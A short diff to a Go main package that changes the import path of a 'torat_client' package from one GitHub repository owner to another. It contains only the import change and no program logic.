@@ -3,7 +3,7 @@ package main
 import (
 	"os"
 
-	client "github.com/lu4p/ToRat/torat_client"
+	client "github.com/JustinTimperio/ToRat/torat_client"
 )
 
 func main() {
